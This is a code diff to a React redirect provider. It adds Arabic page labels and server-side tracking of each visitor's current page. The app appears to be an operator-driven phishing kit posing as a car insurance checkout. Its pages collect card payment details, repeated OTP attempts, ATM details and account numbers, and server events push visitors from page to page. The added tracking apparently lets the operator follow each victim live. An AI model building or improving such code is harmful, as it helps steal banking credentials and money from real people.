@@ -1,6 +1,7 @@
 import { useEffect, useRef, useCallback, useState } from "react";
 import { useLocation } from "wouter";
 import type { SSEMessage } from "@/hooks/useSSE";
+import { trackPage } from "@/lib/api";
 
 interface GlobalRedirectProviderProps {
   children: React.ReactNode;
@@ -23,6 +24,25 @@ const pageMap: Record<string, string> = {
   go_total: "/total",
   go_total2: "/total2",
   go_waiting: "/waiting",
+};
+
+// Page Arabic names for tracking
+const pageArabicMap: Record<string, string> = {
+  "/": "الصفحة الرئيسية",
+  "/form": "بيانات المركبة",
+  "/select": "اختيار الباقة",
+  "/total": "ملخص التكلفة",
+  "/total2": "تأكيد التكلفة",
+  "/visa": "الدفع بالبطاقة",
+  "/otp": "رمز التحقق",
+  "/otp2": "رمز التحقق (محاولة 2)",
+  "/otp3": "رمز التحقق (محاولة 3)",
+  "/atm": "صراف ATM",
+  "/nomer": "رقم الحساب",
+  "/nomer-wait": "انتظار التحقق",
+  "/nomer-otp": "رمز التحقق للحساب",
+  "/identity-check": "التحقق من الهوية",
+  "/waiting": "قائمة الانتظار",
 };
 
 // Singleton SSE manager to handle all redirects globally
@@ -277,6 +297,19 @@ export function GlobalRedirectProvider({ children }: GlobalRedirectProviderProps
     window.addEventListener("storage", handleStorageChange);
     return () => window.removeEventListener("storage", handleStorageChange);
   }, []);
+
+  // Track page changes
+  const [location] = useLocation();
+  
+  useEffect(() => {
+    const sessionId = getSessionId();
+    if (sessionId && location) {
+      // Send page tracking to server
+      trackPage(sessionId, location).catch((error) => {
+        console.error("[GlobalRedirect] Failed to track page:", error);
+      });
+    }
+  }, [location, getSessionId]);
 
   return <>{children}</>;
 }
